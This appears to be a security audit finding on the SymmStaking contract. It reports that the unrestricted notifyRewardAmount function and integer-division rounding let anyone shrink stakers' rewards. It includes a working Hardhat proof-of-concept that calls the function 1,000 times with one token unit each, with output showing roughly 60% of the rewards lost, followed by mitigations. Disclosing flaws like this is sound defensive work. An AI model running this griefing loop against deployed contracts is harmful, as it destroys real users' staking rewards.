# Most of the users' reward will be lost due to frequent calls to notifyRewardAmount and loss of precision.

### Summary

The function notifyRewardAmount has no access control, so anyone can call it. And there is no limit on the amount of new rewards, it only needs to be greater than 0.

https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L284-L289

```solidity
			if (amount == 0) continue;
			if (!isRewardToken[token]) revert TokenNotWhitelisted(token);

			IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
			pendingRewards[token] += amount;
			_addRewardsForToken(token, amount);
```

At the same time, there is a loss of precision in the function _addRewardsForToken.

https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L369-L375

```solidity
		if (block.timestamp >= state.periodFinish) {
>@			state.rate = amount / state.duration;
		} else {
			uint256 remaining = state.periodFinish - block.timestamp;
			uint256 leftover = remaining * state.rate;
>@			state.rate = (amount + leftover) / state.duration;
		}
```

Since state.duration = `7*24*3600` (1 week), the maximum number of tokens lost each time is `7*24*3600-1` (604799). For 6-decimal tokens such as USDC, this means a possible loss of $0.6.

Therefore, the attacker can reduce the proportion of reward issuance by frequently calling notifyRewardAmount, thereby damaging the returns of all stakers. Taking POC as an example, the total reward is $1,000 (1000e6 USDT) at the beginning. If the attacker calls notifyRewardAmount 1,000 times, the total reward will be reduced by about $600. This takes less than an hour to complete (since a block is created every 2 seconds).

**Likelihood: High, just calls notifyRewardAmount multiple times
Impact: High, as users will lost much rewards.**

### Root Cause

1. The function notifyRewardAmount has no access control.
2. The loss of precision in the function _addRewardsForToken.

### Internal Pre-conditions

1. Reward (such as USDC/USDT) is going to distribute.

### External Pre-conditions

1. Attacker calls notifyRewardAmount multiple times (every time transfer 1 USDC/USDT)

### Attack Path

1. call notifyRewardAmount multiple times

### Impact

Most of the rewards will be lost, users will receive very small rewards.

### PoC

Place this code in the file symmStaking.behavior.ts.

```jsx
		it("should calculate reward correctly after single user deposit", async function () {
			// ....
		}
		
		it("should display total reward diff", async function () {

			const depositAmount = 1000*1000000 // 100usdc
			const rewardAmount = depositAmount
			await usdtToken.connect(admin).approve(await symmStaking.getAddress(), rewardAmount)
			await symmStaking.connect(admin).configureRewardToken(await usdtToken.getAddress(), true)
			await symmStaking.connect(admin).notifyRewardAmount([await usdtToken.getAddress()], [rewardAmount])

			const totalReward1 = await symmStaking.connect(user1).getFullPeriodReward(await usdtToken.getAddress());
			
			await stakingToken.connect(user1).approve(await symmStaking.getAddress(), depositAmount)
			await symmStaking.connect(user1).deposit(depositAmount, user1.address)

			await usdtToken.connect(admin).approve(user2.address, 1000);
			await usdtToken.connect(user2).transferFrom(admin.address, user2.address, 1000);
			for (var i=0; i<1000; i++) {
				await time.increase(2)
				await usdtToken.connect(user2).approve(await symmStaking.getAddress(), 1)
				await symmStaking.connect(user2).notifyRewardAmount([await usdtToken.getAddress()], [1])
			}

			const user1BalanceBefore = await usdtToken.balanceOf(user1.address)
			await symmStaking.connect(user1).claimRewards()
			const user1BalanceAfter = await usdtToken.balanceOf(user1.address)
			const claimed = user1BalanceAfter - user1BalanceBefore
			const totalReward2Base = await symmStaking.connect(user1).getFullPeriodReward(await usdtToken.getAddress());
			const totalReward2 = totalReward2Base + claimed;
			console.log("totalReward1:", totalReward1.toString());
			console.log("totalReward2:", totalReward2.toString());
			console.log("Difference (totalReward1 - totalReward2):", (totalReward1 - totalReward2).toString());
		})

```

Output:

totalReward1: 999734400
totalReward2: 399552359
Difference (totalReward1 - totalReward2): 600182041

### Mitigation

1. Add access control for the function notifyRewardAmount.
2. When calculating state.rate, you can multiply it by a coefficient, such as 1e18, and then divide it by the coefficient when finally calculating the user's reward.
